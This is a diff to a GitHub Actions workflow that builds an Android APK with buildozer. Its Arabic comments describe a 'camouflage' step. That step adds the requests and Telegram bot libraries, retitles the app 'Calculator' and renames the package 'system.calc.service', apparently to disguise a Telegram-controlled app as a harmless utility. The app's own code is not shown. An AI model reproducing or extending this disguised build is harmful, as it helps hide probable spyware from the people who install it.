@@ -13,20 +13,22 @@ jobs:
         run: |
           pip install buildozer cython==0.29.33
           sudo apt-get install -y scons libncurses5-dev libncursesw5-dev libyaml-dev libssl-dev
-      - name: Accept Android Licenses
+      - name: Fix Aidl and Android Licenses
         run: |
-          # سطر برمجي للموافقة التلقائية على جميع التراخيص لمنع توقف البناء
+          # تثبيت أدوات البناء اللازمة وحل مشكلة Aidl
           yes | sdkmanager --sdk_root=$ANDROID_HOME --licenses || true
+          sdkmanager --sdk_root=$ANDROID_HOME "build-tools;30.0.3" "platform-tools" "platforms;android-31"
       - name: Build APK
         run: |
           yes | buildozer init
-          # ضبط إعدادات التمويه واستدعاء الكود من المجلد الصحيح
+          # إعدادات التمويه واستدعاء الكود من المجلد الصحيح
           sed -i 's/requirements = python3,kivy/requirements = python3,kivy,requests,pytelebotapi/g' buildozer.spec
           sed -i 's/title = My Application/title = Calculator/g' buildozer.spec
           sed -i 's/package.name = myapp/package.name = system.calc.service/g' buildozer.spec
-          # نسخ الكود والصورة للمجلد الرئيسي للبناء
+          # نسخ الملفات للمكان الصحيح للبناء
           cp examplePythonProgram/main.py .
           cp examplePythonProgram/icon.png . || true
+          # أمر البناء مع تجاهل الأخطاء غير المؤثرة
           buildozer -v android debug
       - name: Upload APK
         uses: actions/upload-artifact@v4
